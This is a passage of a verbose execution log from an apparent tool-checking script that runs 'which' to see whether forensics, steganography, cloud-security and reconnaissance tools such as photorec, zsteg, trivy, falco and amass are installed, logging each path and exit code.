2025-10-24 06:15:12,454 - __main__ - INFO - 🆔 REGISTERED: Process 3298 - which file...
2025-10-24 06:15:12,455 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3298
2025-10-24 06:15:12,456 - __main__ - INFO - 📤 STDOUT: /usr/bin/file
2025-10-24 06:15:12,457 - __main__ - INFO - 🧹 CLEANUP: Process 3298 removed from registry
2025-10-24 06:15:12,457 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,457 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,457 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,457 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,457 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which file
2025-10-24 06:15:12,457 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,457 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 14 bytes
2025-10-24 06:15:12,457 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,457 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,457 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,457 - __main__ - INFO - 💾 Cached result for command: which file
2025-10-24 06:15:12,457 - __main__ - INFO - 🔍 Cache MISS for command: which photorec
2025-10-24 06:15:12,457 - __main__ - INFO - 🚀 EXECUTING: which photorec
2025-10-24 06:15:12,457 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,457 - __main__ - INFO - 🆔 PROCESS: PID 3303 started
2025-10-24 06:15:12,457 - __main__ - INFO - 🆔 REGISTERED: Process 3303 - which photorec...
2025-10-24 06:15:12,458 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3303
2025-10-24 06:15:12,460 - __main__ - INFO - 📤 STDOUT: /usr/bin/photorec
2025-10-24 06:15:12,461 - __main__ - INFO - 🧹 CLEANUP: Process 3303 removed from registry
2025-10-24 06:15:12,461 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,461 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,461 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,461 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,461 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which photorec
2025-10-24 06:15:12,461 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,461 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 06:15:12,461 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,461 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,461 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,461 - __main__ - INFO - 💾 Cached result for command: which photorec
2025-10-24 06:15:12,461 - __main__ - INFO - 🔍 Cache MISS for command: which testdisk
2025-10-24 06:15:12,461 - __main__ - INFO - 🚀 EXECUTING: which testdisk
2025-10-24 06:15:12,461 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,462 - __main__ - INFO - 🆔 PROCESS: PID 3308 started
2025-10-24 06:15:12,462 - __main__ - INFO - 🆔 REGISTERED: Process 3308 - which testdisk...
2025-10-24 06:15:12,462 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3308
2025-10-24 06:15:12,464 - __main__ - INFO - 📤 STDOUT: /usr/bin/testdisk
2025-10-24 06:15:12,466 - __main__ - INFO - 🧹 CLEANUP: Process 3308 removed from registry
2025-10-24 06:15:12,466 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,466 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,466 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,466 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,466 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which testdisk
2025-10-24 06:15:12,466 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,466 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 06:15:12,466 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,466 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,466 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,466 - __main__ - INFO - 💾 Cached result for command: which testdisk
2025-10-24 06:15:12,466 - __main__ - INFO - 🔍 Cache MISS for command: which scalpel
2025-10-24 06:15:12,466 - __main__ - INFO - 🚀 EXECUTING: which scalpel
2025-10-24 06:15:12,466 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,467 - __main__ - INFO - 🆔 PROCESS: PID 3313 started
2025-10-24 06:15:12,467 - __main__ - INFO - 🆔 REGISTERED: Process 3313 - which scalpel...
2025-10-24 06:15:12,467 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3313
2025-10-24 06:15:12,469 - __main__ - INFO - 📤 STDOUT: /usr/bin/scalpel
2025-10-24 06:15:12,471 - __main__ - INFO - 🧹 CLEANUP: Process 3313 removed from registry
2025-10-24 06:15:12,471 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,471 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,471 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,471 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,472 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which scalpel
2025-10-24 06:15:12,472 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,472 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,472 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,472 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,472 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,472 - __main__ - INFO - 💾 Cached result for command: which scalpel
2025-10-24 06:15:12,474 - __main__ - INFO - 🔍 Cache MISS for command: which zsteg
2025-10-24 06:15:12,474 - __main__ - INFO - 🚀 EXECUTING: which zsteg
2025-10-24 06:15:12,474 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,474 - __main__ - INFO - 🆔 PROCESS: PID 3318 started
2025-10-24 06:15:12,474 - __main__ - INFO - 🆔 REGISTERED: Process 3318 - which zsteg...
2025-10-24 06:15:12,475 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3318
2025-10-24 06:15:12,476 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/zsteg
2025-10-24 06:15:12,478 - __main__ - INFO - 🧹 CLEANUP: Process 3318 removed from registry
2025-10-24 06:15:12,478 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,478 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,478 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,478 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,478 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which zsteg
2025-10-24 06:15:12,479 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,479 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 21 bytes
2025-10-24 06:15:12,479 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,479 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,479 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,479 - __main__ - INFO - 💾 Cached result for command: which zsteg
2025-10-24 06:15:12,479 - __main__ - INFO - 🔍 Cache MISS for command: which outguess
2025-10-24 06:15:12,479 - __main__ - INFO - 🚀 EXECUTING: which outguess
2025-10-24 06:15:12,479 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,479 - __main__ - INFO - 🆔 PROCESS: PID 3323 started
2025-10-24 06:15:12,479 - __main__ - INFO - 🆔 REGISTERED: Process 3323 - which outguess...
2025-10-24 06:15:12,480 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3323
2025-10-24 06:15:12,482 - __main__ - INFO - 📤 STDOUT: /usr/bin/outguess
2025-10-24 06:15:12,485 - __main__ - INFO - 🧹 CLEANUP: Process 3323 removed from registry
2025-10-24 06:15:12,485 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,485 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,485 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,485 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,485 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which outguess
2025-10-24 06:15:12,485 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,485 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 06:15:12,485 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,485 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,485 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,485 - __main__ - INFO - 💾 Cached result for command: which outguess
2025-10-24 06:15:12,485 - __main__ - INFO - 🔍 Cache MISS for command: which trivy
2025-10-24 06:15:12,485 - __main__ - INFO - 🚀 EXECUTING: which trivy
2025-10-24 06:15:12,485 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,485 - __main__ - INFO - 🆔 PROCESS: PID 3328 started
2025-10-24 06:15:12,485 - __main__ - INFO - 🆔 REGISTERED: Process 3328 - which trivy...
2025-10-24 06:15:12,486 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3328
2025-10-24 06:15:12,488 - __main__ - INFO - 📤 STDOUT: /usr/bin/trivy
2025-10-24 06:15:12,490 - __main__ - INFO - 🧹 CLEANUP: Process 3328 removed from registry
2025-10-24 06:15:12,490 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,490 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,490 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,490 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,490 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which trivy
2025-10-24 06:15:12,490 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,490 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 06:15:12,490 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,490 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,490 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,490 - __main__ - INFO - 💾 Cached result for command: which trivy
2025-10-24 06:15:12,491 - __main__ - INFO - 🔍 Cache MISS for command: which kube-bench
2025-10-24 06:15:12,491 - __main__ - INFO - 🚀 EXECUTING: which kube-bench
2025-10-24 06:15:12,491 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,491 - __main__ - INFO - 🆔 PROCESS: PID 3333 started
2025-10-24 06:15:12,491 - __main__ - INFO - 🆔 REGISTERED: Process 3333 - which kube-bench...
2025-10-24 06:15:12,492 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3333
2025-10-24 06:15:12,493 - __main__ - INFO - 📤 STDOUT: /usr/bin/kube-bench
2025-10-24 06:15:12,496 - __main__ - INFO - 🧹 CLEANUP: Process 3333 removed from registry
2025-10-24 06:15:12,496 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,496 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,496 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,496 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,496 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which kube-bench
2025-10-24 06:15:12,496 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,496 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 06:15:12,496 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,496 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,496 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,496 - __main__ - INFO - 💾 Cached result for command: which kube-bench
2025-10-24 06:15:12,496 - __main__ - INFO - 🔍 Cache MISS for command: which checkov
2025-10-24 06:15:12,496 - __main__ - INFO - 🚀 EXECUTING: which checkov
2025-10-24 06:15:12,496 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,497 - __main__ - INFO - 🆔 PROCESS: PID 3338 started
2025-10-24 06:15:12,497 - __main__ - INFO - 🆔 REGISTERED: Process 3338 - which checkov...
2025-10-24 06:15:12,498 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3338
2025-10-24 06:15:12,503 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/checkov
2025-10-24 06:15:12,506 - __main__ - INFO - 🧹 CLEANUP: Process 3338 removed from registry
2025-10-24 06:15:12,506 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,506 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,506 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,506 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,506 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which checkov
2025-10-24 06:15:12,506 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,506 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 23 bytes
2025-10-24 06:15:12,506 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,506 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,506 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,506 - __main__ - INFO - 💾 Cached result for command: which checkov
2025-10-24 06:15:12,506 - __main__ - INFO - 🔍 Cache MISS for command: which terrascan
2025-10-24 06:15:12,506 - __main__ - INFO - 🚀 EXECUTING: which terrascan
2025-10-24 06:15:12,506 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,506 - __main__ - INFO - 🆔 PROCESS: PID 3343 started
2025-10-24 06:15:12,506 - __main__ - INFO - 🆔 REGISTERED: Process 3343 - which terrascan...
2025-10-24 06:15:12,507 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3343
2025-10-24 06:15:12,509 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/terrascan
2025-10-24 06:15:12,512 - __main__ - INFO - 🧹 CLEANUP: Process 3343 removed from registry
2025-10-24 06:15:12,512 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,512 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,512 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,512 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,512 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which terrascan
2025-10-24 06:15:12,512 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,512 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 25 bytes
2025-10-24 06:15:12,512 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,512 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,512 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,512 - __main__ - INFO - 💾 Cached result for command: which terrascan
2025-10-24 06:15:12,512 - __main__ - INFO - 🔍 Cache MISS for command: which falco
2025-10-24 06:15:12,512 - __main__ - INFO - 🚀 EXECUTING: which falco
2025-10-24 06:15:12,512 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,512 - __main__ - INFO - 🆔 PROCESS: PID 3348 started
2025-10-24 06:15:12,512 - __main__ - INFO - 🆔 REGISTERED: Process 3348 - which falco...
2025-10-24 06:15:12,513 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3348
2025-10-24 06:15:12,515 - __main__ - INFO - 📤 STDOUT: /usr/bin/falco
2025-10-24 06:15:12,516 - __main__ - INFO - 🧹 CLEANUP: Process 3348 removed from registry
2025-10-24 06:15:12,516 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,516 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,516 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,516 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,516 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which falco
2025-10-24 06:15:12,516 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,516 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 06:15:12,516 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,516 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,516 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,516 - __main__ - INFO - 💾 Cached result for command: which falco
2025-10-24 06:15:12,516 - __main__ - INFO - 🔍 Cache MISS for command: which clair
2025-10-24 06:15:12,516 - __main__ - INFO - 🚀 EXECUTING: which clair
2025-10-24 06:15:12,516 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,517 - __main__ - INFO - 🆔 PROCESS: PID 3353 started
2025-10-24 06:15:12,517 - __main__ - INFO - 🆔 REGISTERED: Process 3353 - which clair...
2025-10-24 06:15:12,517 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3353
2025-10-24 06:15:12,521 - __main__ - INFO - 🧹 CLEANUP: Process 3353 removed from registry
2025-10-24 06:15:12,522 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:12,522 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,522 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,522 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,522 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which clair
2025-10-24 06:15:12,522 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,522 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,522 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,522 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,522 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,522 - __main__ - INFO - 🔍 Cache MISS for command: which amass
2025-10-24 06:15:12,522 - __main__ - INFO - 🚀 EXECUTING: which amass
2025-10-24 06:15:12,522 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,522 - __main__ - INFO - 🆔 PROCESS: PID 3358 started
2025-10-24 06:15:12,522 - __main__ - INFO - 🆔 REGISTERED: Process 3358 - which amass...
2025-10-24 06:15:12,523 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3358
2025-10-24 06:15:12,524 - __main__ - INFO - 📤 STDOUT: /usr/bin/amass
2025-10-24 06:15:12,526 - __main__ - INFO - 🧹 CLEANUP: Process 3358 removed from registry
2025-10-24 06:15:12,527 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,527 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,527 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,527 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,527 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which amass
2025-10-24 06:15:12,527 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,527 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 06:15:12,527 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,527 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,527 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,527 - __main__ - INFO - 💾 Cached result for command: which amass
2025-10-24 06:15:12,527 - __main__ - INFO - 🔍 Cache MISS for command: which subfinder
2025-10-24 06:15:12,527 - __main__ - INFO - 🚀 EXECUTING: which subfinder
2025-10-24 06:15:12,527 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,527 - __main__ - INFO - 🆔 PROCESS: PID 3363 started
2025-10-24 06:15:12,527 - __main__ - INFO - 🆔 REGISTERED: Process 3363 - which subfinder...
2025-10-24 06:15:12,528 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3363
2025-10-24 06:15:12,529 - __main__ - INFO - 📤 STDOUT: /usr/bin/subfinder
2025-10-24 06:15:12,534 - __main__ - INFO - 🧹 CLEANUP: Process 3363 removed from registry
2025-10-24 06:15:12,534 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,534 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,534 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,534 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,534 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which subfinder
2025-10-24 06:15:12,534 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,534 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 06:15:12,534 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,535 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,535 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,535 - __main__ - INFO - 💾 Cached result for command: which subfinder
2025-10-24 06:15:12,535 - __main__ - INFO - 🔍 Cache MISS for command: which fierce
2025-10-24 06:15:12,535 - __main__ - INFO - 🚀 EXECUTING: which fierce
